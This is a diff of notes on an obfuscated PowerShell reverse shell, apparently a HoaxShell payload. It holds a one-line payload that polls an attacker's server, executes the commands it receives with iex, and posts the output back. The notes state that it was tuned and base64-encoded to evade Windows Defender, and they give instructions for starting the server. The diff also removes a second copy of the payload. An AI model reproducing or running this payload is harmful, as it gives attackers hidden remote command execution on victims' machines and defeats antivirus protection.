@@ -10,9 +10,7 @@ Invoke-RestMethod -UseBasicParsing -Uri $p$s/212f63c5 -Headers @{"Authorization"
 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]:
 :UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}.
 
-# This is the above commands that are obsfuscated and has been tested with 
-# Windows Defender running. I have left it as one line to avoid any issues with 
-# the newline character difference in windows
+# This is the above commands that are obsfuscated and has been tested with Windows Defender running. I have left it as one line to avoid any issues with the newline character difference in windows
 #
 # An example of the obsfucation is:
 # $ pwd 
@@ -21,17 +19,6 @@ Invoke-RestMethod -UseBasicParsing -Uri $p$s/212f63c5 -Headers @{"Authorization"
  
 
 $s='172.x.x.x:8080';$i='6bc8886b-e313f625-d3930481';$p='http://';$v=Invoke-Re''stM''ethod -UseBasicParsing -Uri $p$s/6bc8886b -Headers @{"Authorization"=$i};while ($true){$c=(In'v'ok''e-Res''tMethod -UseBasicParsing -Uri $p$s/e313f625 -HeADers @{"Authorization"=$i});if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-St'r'i''ng -InputObject $r;$t=Invoke-Rest'Me't'h'od -Uri $p$s/d3930481 -Method POST -Headers @{"Authorization"=$i} -BoDY ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sle'e'p 0.8}
-
-# OR for readability in this explanation (Note - will contain sketchy Newline characters)
-
-$s='172.x.x.x:8080';$i='0588f139-3e06a531-8bad89e2';$p='http://';$v=
-I'n'v''o''ke-Res''tMe''t'h'od -UseBasicParsing -Uri $p$s/0588f139 -Headers @
-{"Authorization"=$i};while ($true){$c=(I'nvok'e-R'e'stMethod -UseBasicParsing
- -Uri $p$s/3e06a531 -Headers @{"Authorization"=$i});if ($c -ne 'None') 
-{$r=i'ex' $c -ErrorAction Stop -ErrorVariable e;$r=Out-St'r'ing -InputObject 
-$r;$t=Invoke-Re's't'M'e't'h'o'd -Uri $p$s/8bad89e2 -Method POST -Headers @
-{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')}
- sl''e''ep 0.8}
 
 # Below is the above obsfuscated command re encoded to base64 string
 # ie: $ echo "foo" | base64
@@ -62,7 +49,7 @@ ZXMoKykgLWpvaW4gJyAnKX0gc2xlJ2UncCAwLjh9Cg==
 # source code to output the strings in base64 that are now undetectabl;e by
 # Windows Defender 
 #
-# Use ./hoaxshell.py -s 172.234.252.140 -i -H "Authorization" to get things 
+# Use ./hoaxshell.py -s 172.x.x.x -i -H "Authorization" to get things 
 # running on your server - change the ip address to your server ip
 #
 # I changed the following 2 files
